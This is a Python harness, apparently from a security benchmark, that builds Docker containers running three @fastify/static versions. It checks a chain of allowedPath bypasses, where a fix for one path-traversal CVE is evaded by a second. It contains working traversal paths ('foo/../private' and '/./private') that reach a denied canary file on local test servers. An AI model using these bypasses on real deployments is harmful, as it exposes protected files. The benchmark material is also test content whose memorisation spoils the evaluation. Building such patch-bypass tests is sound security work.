#!/usr/bin/env python3
"""Flag differential oracle for fastify-static-cve-2026-7120.

Chain: CVE-2026-15074 (non-leading '..' allowedPath bypass, fixed 10.1.1)
     -> CVE-2026-7120  (non-canonical '/./' allowedPath bypass, fixed 10.1.2).

V0 = @fastify/static 10.1.0 (both bypass)
V1 = @fastify/static 10.1.1 (15074 fixed; 7120 still bypasses)  <- the target
V2 = @fastify/static 10.1.2 (7120 fixed)

Canary /data/root/private/canary.txt is denied by allowedPath (pathname starts
with /private/). The seed uses a non-leading '..' path; the residual uses '/./'.
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

import urllib.request

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import FlagOracle, new_flag, validate_case_strict  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()

BASE = {"v0": 55140, "v1": 55141, "v2": 55142}


def _get(port, path):
    req = urllib.request.Request(f"http://127.0.0.1:{port}{path}", method="GET")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
    except Exception as e:
        return {"status": getattr(e, "code", None), "body": ""}


def run_probe(candidate, *, version="v1"):
    return _get(BASE[version], candidate["path"])


def original_poc(*, version="v1"):
    return _get(BASE[version], "/static/foo/../private/canary.txt")


def bypass_poc(*, version="v1"):
    return _get(BASE[version], "/static/./private/canary.txt")


def mechanism_scope(candidate) -> bool:
    return "canary.txt" in candidate.get("path", "")


def build_oracle() -> FlagOracle:
    o = FlagOracle(FLAG, run_probe, mechanism_scope)
    o.prime_seed(original_poc)
    return o


def gate() -> dict:
    return validate_case_strict(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
        bypass_on_v2=bypass_poc(version="v2"),
    )


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _wait_canary(version: str, token: str, tries: int = 40) -> bool:
    for _ in range(tries):
        if token in bypass_poc(version=version)["body"]:
            return True
        time.sleep(2)
    return False


def _profile_flags(profiles):
    flags = []
    for p in profiles:
        flags += ["--profile", p]
    return flags


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(("v0", "v1", "v2"))
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "build", env=env)
    if r.returncode != 0:
        return {"error": "build failed", "stderr": r.stderr[-2000:]}
    r = _compose(*_profile_flags(profiles), "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:]}
    ready = {v: _wait_canary(v, FLAG) for v in profiles}
    result = gate()
    result["_env_ready"] = ready
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
